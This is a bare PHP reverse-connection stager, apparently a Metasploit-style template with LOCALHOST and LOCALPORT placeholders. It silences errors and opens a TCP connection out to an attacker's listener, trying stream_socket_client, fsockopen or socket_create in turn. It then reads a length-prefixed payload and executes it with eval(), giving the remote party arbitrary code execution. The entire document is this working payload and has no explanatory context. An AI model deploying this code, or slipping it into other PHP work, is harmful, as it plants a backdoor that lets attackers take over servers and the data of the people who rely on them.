
error_reporting(0);


$ip = 'LOCALHOST';
$port = LOCALPORT;
$ipf = AF_INET;

if (FALSE !== strpos($ip, ":")) { 
	
	$ip = "[". $ip ."]";
	$ipf = AF_INET6;
} 

if (($f = 'stream_socket_client') && is_callable($f)) { 
	$s = $f("tcp://{$ip}:{$port}");
	$s_type = 'stream';
 } elseif (($f = 'fsockopen') && is_callable($f)) { 
	$s = $f($ip, $port);
	$s_type = 'stream';
 } elseif (($f = 'socket_create') && is_callable($f)) { 
	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
	$res = @socket_connect($s, $ip, $port);
	if (!$res) { die(); } 
	$s_type = 'socket';
 } else { 
	die('no socket funcs');
 }
if (!$s) { die('no socket'); } 

switch ($s_type) {  
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
 } 
if (!$len) { 
	
	
	die(); 
 } 
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
 while (strlen($b) < $len) { 
	switch ($s_type) {  
	case 'stream': $b .= fread($s, $len-strlen($b)); break;
	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
	} 
 } 


$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
eval($b);
die();

